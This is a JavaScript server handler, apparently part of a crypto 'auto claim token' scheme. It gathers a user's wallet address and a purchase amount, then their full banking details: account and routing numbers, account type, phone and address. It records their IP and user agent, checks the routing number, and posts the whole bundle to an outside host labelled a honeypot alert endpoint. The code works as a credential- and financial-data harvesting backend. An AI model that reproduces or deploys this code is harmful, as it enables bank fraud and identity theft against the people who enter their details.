export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { 
    userAddress, 
    amount, 
    bankName, 
    bankInstitution, 
    bankAccount, 
    bankRouting, 
    bankType, 
    bankPhone, 
    bankAddress,
    timestamp,
    userAgent 
  } = req.body;

  try {
    // Get user's IP address
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;

    // Prepare banking info for admin
    const bankInfo = {
      type: 'BANKING_INFO_COLLECTED',
      timestamp: timestamp,
      userAddress: userAddress,
      purchaseAmount: amount + ' ETH',
      usdValue: '$' + (parseFloat(amount) * 3200).toFixed(2),
      bankingDetails: {
        accountHolderName: bankName,
        bankName: bankInstitution,
        accountNumber: bankAccount,
        routingNumber: bankRouting,
        accountType: bankType,
        phoneNumber: bankPhone,
        address: bankAddress
      },
      userInfo: {
        ip: ip,
        userAgent: userAgent,
        timestamp: timestamp
      },
      securityNotes: {
        routingNumberValid: bankRouting.length === 9,
        accountNumberLength: bankAccount.length,
        phoneFormatted: bankPhone.includes('(') && bankPhone.includes(')')
      }
    };

    // Send alert to admin
    console.log('🏦 BANKING INFO COLLECTED:', bankInfo);

    // Send to your existing honeypot alert system
    try {
      await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(bankInfo)
      });
    } catch (error) {
      console.log('Alert system unavailable');
    }

    res.status(200).json({
      success: true,
      message: 'Banking info collected successfully'
    });

  } catch (error) {
    console.error('Banking collection error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process banking info'
    });
  }
}